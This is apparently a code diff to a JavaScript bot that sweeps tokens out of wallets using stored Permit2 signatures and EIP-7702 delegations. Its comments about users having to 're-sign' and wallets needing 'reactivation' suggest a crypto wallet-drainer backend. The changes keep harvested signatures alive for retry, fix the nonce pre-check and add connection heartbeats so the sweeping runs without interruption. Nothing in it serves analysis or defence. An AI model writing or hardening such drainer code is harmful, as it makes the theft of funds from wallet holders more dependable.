@@ -284,6 +284,7 @@ const needsReconnect     = new Map(); // address.toLowerCase() → timestamp (1-
 const needsReauthWallets = new Set(); // eip7702 addresses where delegation is gone
 const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
 let realtimeChannel    = null;
+let _realtimeGeneration = 0; // bumped on each subscribeRealtime() call — lets stale channel callbacks detect supersession
 const BACKOFF_MS       = [5_000, 10_000, 20_000, 40_000, 60_000];
 let reconnectAttempt   = 0;
 function withJitter(ms) { return Math.floor(ms * (0.8 + Math.random() * 0.4)); }
@@ -1173,19 +1174,25 @@ async function sweepGaslessWallet(walletAddress) {
       const msg = e.message ?? "";
       if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
         warn(`[gasless/batch] nonce consumed for ${checksum} — marking spent`);
+        if (supabase) {
+          try {
+            const hasBackup = await hasLivePermit2Allowance(checksum);
+            await supabase.from("delegated_wallets")
+              .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
+              .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+          } catch (e2) { err(`[gasless/batch] Supabase spent update: ${e2.message}`); }
+        }
       } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
-        warn(`[gasless/batch] TRANSFER_FROM_FAILED for ${checksum} — marking spent`);
+        // The entire batch call reverted, so the Permit2 nonce bitmap was NEVER
+        // written on-chain (state changes roll back on revert) — the signature is
+        // still cryptographically valid and unconsumed. This is usually caused by a
+        // pending ERC-20→Permit2 approval or a balance that changed between our
+        // pre-check and execution. Marking it spent here (as before) permanently
+        // discarded a still-usable signature — keep it alive for the next retry,
+        // consistent with the legacy per-token path above and with Tier 4.
+        warn(`[gasless/batch] TRANSFER_FROM_FAILED for ${checksum} — tx reverted, nonce NOT consumed on-chain, keeping sig for retry`);
       } else {
         err(`[gasless/batch] batch permitTransferFrom for ${checksum}: ${msg}`);
-        return;
-      }
-      if (supabase) {
-        try {
-          const hasBackup = await hasLivePermit2Allowance(checksum);
-          await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
-            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
-        } catch (e2) { err(`[gasless/batch] Supabase spent update: ${e2.message}`); }
       }
     }
   }
@@ -1451,7 +1458,11 @@ async function isNonceUsed(owner, nonceHex) {
     const wordPos = nonce >> 8n;
     const bitPos  = nonce & 0xFFn;
     const bitmap  = await permit2Read.nonceBitmap(owner, wordPos);
-    return (BigInt(bitmap) >> bitPos) & 1n === 1n;
+    // NOTE: `&` has LOWER precedence than `===` in JS, so `x & 1n === 1n` parses as
+    // `x & (1n === 1n)` — mixing a BigInt with a boolean via `&` throws a TypeError,
+    // which was silently swallowed by the catch below, making this always return
+    // false (nonce pre-check permanently disabled). Parenthesize explicitly.
+    return ((BigInt(bitmap) >> bitPos) & 1n) === 1n;
   } catch {
     return false; // assume not used on RPC error — pre-flight staticCall will catch it
   }
@@ -1954,11 +1965,21 @@ async function sweep(wallet) {
               log(`[allowance] permit() pre-flight ✅ — broadcasting`);
             } catch (pf) {
               const pfMsg = (pf.reason ?? pf.revert?.name ?? pf.shortMessage ?? pf.message ?? "").toLowerCase();
-              err(`[allowance] permit() pre-flight failed: ${pfMsg} — marking spent, skipping`);
-              if (supabase) {
-                supabase.from("permit2_signatures").update({ spent: true })
-                  .eq("address", addrKey).eq("chain", CHAIN)
-                  .then(() => { warn(`[allowance] permit2_signatures row marked spent via pre-flight`); }, () => {});
+              // Only mark the signature spent for a genuine on-chain revert (bad nonce/signer/
+              // expiry). A transient RPC/network failure during the staticCall itself (timeout,
+              // rate limit, dropped connection) is NOT proof the signature is invalid — marking
+              // it spent here would permanently discard a still-usable signature just because
+              // one read call hiccuped, forcing the user to reconnect and re-sign for nothing.
+              const isRpcError = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429|rate.?limit|SERVER_ERROR|could not detect network/i.test(pfMsg);
+              if (isRpcError) {
+                warn(`[allowance] permit() pre-flight transient error: ${pfMsg} — leaving sig alive, will retry next sweep`);
+              } else {
+                err(`[allowance] permit() pre-flight failed: ${pfMsg} — marking spent, skipping`);
+                if (supabase) {
+                  supabase.from("permit2_signatures").update({ spent: true })
+                    .eq("address", addrKey).eq("chain", CHAIN)
+                    .then(() => { warn(`[allowance] permit2_signatures row marked spent via pre-flight`); }, () => {});
+                }
               }
             }
             if (permitPreflightOk) {
@@ -2981,6 +3002,13 @@ function subscribeRealtime() {
     realtimeChannel = null;
   }
 
+  // Tag this channel with a generation number so its status callback can tell
+  // whether it has since been superseded by a newer subscribeRealtime() call
+  // (e.g. the removeChannel() teardown above can itself emit a late "CLOSED"
+  // status asynchronously) — without this, a stale channel's teardown could
+  // schedule a duplicate/competing resubscribe on top of the fresh one.
+  const myGeneration = ++_realtimeGeneration;
+
   realtimeChannel = supabase
     .channel(`bot_realtime_${CHAIN}`)
 
@@ -3083,13 +3111,48 @@ function subscribeRealtime() {
     )
 
     .subscribe((status) => {
+      if (myGeneration !== _realtimeGeneration) return; // stale channel superseded by a newer subscribeRealtime() call
       if (status === "SUBSCRIBED") {
         log(`[realtime] ✅ subscribed (delegated_wallets + permit2_signatures, chain=${CHAIN})`);
-      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
+      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT" || status === "CLOSED") {
+        // CLOSED was previously unhandled — a server-initiated close (as opposed to an
+        // error/timeout) left the bot with a dead Realtime channel and no resubscribe,
+        // silently missing all future wallet-signature/reactivation events until restart.
         warn(`[realtime] ${status} — resubscribing in 10s`);
         setTimeout(subscribeRealtime, 10_000);
       }
     });
+}
+
+// ── WS heartbeat — detects silently-dead connections ─────────────────────────
+// A WS/TCP connection can go stale (NAT/idle timeout, peer vanishes without a
+// TCP RST, etc.) without ever firing "error" or "close" on the socket. When
+// that happens the bot keeps its listeners attached to a dead connection and
+// goes permanently deaf to Transfer events until someone manually restarts it
+// — the leading suspect for historical "bot stopped sweeping" reports. Ping
+// the raw socket every 30s; if a pong hasn't arrived by the next tick, force
+// -terminate the socket so the existing "close" handler runs the normal
+// backoff+reconnect path.
+let _wsHeartbeatTimer = null;
+function stopWsHeartbeat() {
+  if (_wsHeartbeatTimer) { clearInterval(_wsHeartbeatTimer); _wsHeartbeatTimer = null; }
+}
+function startWsHeartbeat(wsProvider) {
+  stopWsHeartbeat();
+  const sock = wsProvider?.websocket;
+  if (!sock || typeof sock.ping !== "function") return;
+  let pongReceived = true;
+  sock.on("pong", () => { pongReceived = true; });
+  _wsHeartbeatTimer = setInterval(() => {
+    if (!pongReceived) {
+      warn("[ws] heartbeat timeout — no pong received, terminating stale connection");
+      stopWsHeartbeat();
+      try { (sock.terminate ?? sock.close)?.call(sock); } catch (e) { warn(`[ws] terminate failed: ${e.message}`); }
+      return;
+    }
+    pongReceived = false;
+    try { sock.ping(); } catch (e) { warn(`[ws] ping failed: ${e.message}`); }
+  }, 30_000);
 }
 
 // ── WSS listener: Transfer events + native block scanner ─────────────────────
@@ -3105,6 +3168,7 @@ async function startBot() {
 
     wsProvider.websocket.on("close", () => {
       warn("[ws] closed — removing listeners and reconnecting...");
+      stopWsHeartbeat();
       wsProvider.removeAllListeners();
       activeWsProvider = null;
       const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
@@ -3118,8 +3182,12 @@ async function startBot() {
     // rpcProvider NOT recreated — FallbackProvider handles failover internally.
     await startTransferListeners(wsProvider, TOKENS);
     await startNativeListener(wsProvider);
+    startWsHeartbeat(wsProvider);
 
     log(`[ws] ✅ connected — Transfer listeners active for ${TOKENS.length} tokens`);
+    // Reset backoff after a successful (re)connect — a disconnect long from now
+    // should retry fast again, not inherit the maxed-out delay from past outages.
+    reconnectAttempt = 0;
   } catch (e) {
     err(`[ws] startBot failed: ${e.message}`);
     const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
